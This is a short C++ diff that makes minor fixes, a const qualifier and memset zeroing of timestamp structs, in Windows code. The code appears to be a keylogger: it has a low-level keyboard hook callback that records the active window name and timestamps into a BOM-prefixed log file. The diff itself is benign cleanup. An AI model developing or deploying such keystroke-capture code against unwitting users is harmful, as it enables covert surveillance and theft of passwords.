@@ -21,7 +21,7 @@ void writeBOMIfNeeded(const char *filename)
     if (stat(filename, &buffer) != 0)
     {
         std::ofstream file(filename, std::ios::binary);
-        unsigned char bom[] = {0xEF, 0xBB, 0xBF};
+        const unsigned char bom[] = {0xEF, 0xBB, 0xBF};
         file.write(reinterpret_cast<const char *>(bom), 3);
         file.close();
     }
@@ -114,6 +114,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
             strncpy(last_name, name, MY_MAX_PATH);
             time_t now = time(0);
             struct tm tstruct;
+            memset(&tstruct, 0, sizeof(tstruct));
             localtime_s(&tstruct, &now);
             char timebuf[32];
             strftime(timebuf, sizeof(timebuf), "%d.%m.%Y %H:%M:%S", &tstruct);
@@ -129,6 +130,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
         }
         time_t now = time(0);
         struct tm tstruct;
+        memset(&tstruct, 0, sizeof(tstruct));
         localtime_s(&tstruct, &now);
         char timebuf[32];
         strftime(timebuf, sizeof(timebuf), "%d.%m.%Y %H:%M:%S", &tstruct);
